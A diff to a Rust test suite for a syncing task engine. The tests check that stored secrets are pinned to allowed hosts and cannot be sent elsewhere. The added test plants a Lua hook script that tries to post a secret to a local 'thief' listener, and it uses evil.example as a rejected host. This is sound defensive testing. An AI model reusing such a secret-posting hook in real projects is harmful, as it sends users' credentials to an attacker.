@@ -367,12 +367,26 @@ fn hooks_run_on_the_phone_and_secrets_are_listed_by_name_only() {
     assert_eq!(api(&mut engine, "PUT", "/api/hooks", "").0, 200);
     assert_eq!(run(&mut engine, "1 modify priority:H")["wrote"], true);
 
-    // Secrets: the names come back, never the values.
-    assert_eq!(api(&mut engine, "PUT", "/api/secrets/jira", "tok-123").0, 200);
+    // Secrets: the names and hosts come back, never the values.
+    let jira = r#"{"value":"tok-123","hosts":["acme.atlassian.net"]}"#;
+    assert_eq!(api(&mut engine, "PUT", "/api/secrets/jira", jira).0, 200);
     assert_eq!(api(&mut engine, "PUT", "/api/secrets/9bad", "x").0, 400);
+    let bad_host = r#"{"value":"x","hosts":["https://evil.example/"]}"#;
+    assert_eq!(api(&mut engine, "PUT", "/api/secrets/other", bad_host).0, 400);
     let (_, names) = api(&mut engine, "GET", "/api/secrets", "");
     assert_eq!(names["names"], json!(["jira"]));
+    assert_eq!(
+        names["secrets"],
+        json!([{ "name": "jira", "hosts": ["acme.atlassian.net"] }])
+    );
     assert!(!names.to_string().contains("tok-123"));
+    // There is no way to change the hosts without the value: a body without one is refused.
+    let hosts_only = r#"{"hosts":["evil.example"]}"#;
+    assert_eq!(api(&mut engine, "PUT", "/api/secrets/jira", hosts_only).0, 400);
+    assert_eq!(
+        api(&mut engine, "GET", "/api/secrets", "").1["secrets"][0]["hosts"],
+        json!(["acme.atlassian.net"])
+    );
     assert_eq!(api(&mut engine, "DELETE", "/api/secrets/jira", "").0, 200);
     assert_eq!(api(&mut engine, "GET", "/api/secrets", "").1["names"], json!([]));
 }
@@ -435,4 +449,41 @@ fn settings_and_hooks_follow_the_bucket_only_for_the_phones_that_turned_them_on(
     api(&mut a, "PUT", "/api/secrets/jira", "tok-123");
     a.sync(&both).unwrap();
     assert!(!bucket.lock().unwrap().objects.keys().any(|k| k.contains("secret")));
+}
+
+#[test]
+fn a_script_planted_in_the_bucket_cannot_send_the_phones_secrets_elsewhere() {
+    // Someone with the bucket's keys (not the encryption secret) writes a hooks.lua that posts a secret to their host.
+    let (endpoint, bucket) = serve();
+    let thief = TcpListener::bind("127.0.0.1:0").unwrap();
+    let port = thief.local_addr().unwrap().port();
+    thief.set_nonblocking(true).unwrap();
+    let both = with_files(&endpoint, &["web/hooks.lua"]);
+    let mut phone = engine();
+    let jira = r#"{"value":"tok-PHONE-ONLY","hosts":["acme.atlassian.net"]}"#;
+    assert_eq!(api(&mut phone, "PUT", "/api/secrets/jira", jira).0, 200);
+    phone.sync(&both).unwrap();
+    let planted = format!(
+        r#"allow_hosts{{"localhost"}}
+           function on_add(task)
+             local res, err = http.post("http://localhost:{port}/", {{ body = secret("jira") }})
+             say(err or "sent")
+           end"#
+    );
+    bucket
+        .lock()
+        .unwrap()
+        .objects
+        .insert("web/hooks.lua".into(), (planted.into_bytes(), 999));
+    assert_eq!(phone.sync(&both).unwrap(), ["web/hooks.lua"]);
+    let added = run(&mut phone, "add Something");
+    assert!(
+        added
+            .to_string()
+            .contains("jira may only be sent to acme.atlassian.net"),
+        "{added}"
+    );
+    assert!(!added.to_string().contains("tok-PHONE-ONLY"));
+    std::thread::sleep(std::time::Duration::from_millis(200));
+    assert!(thief.accept().is_err(), "the planted script reached its host");
 }
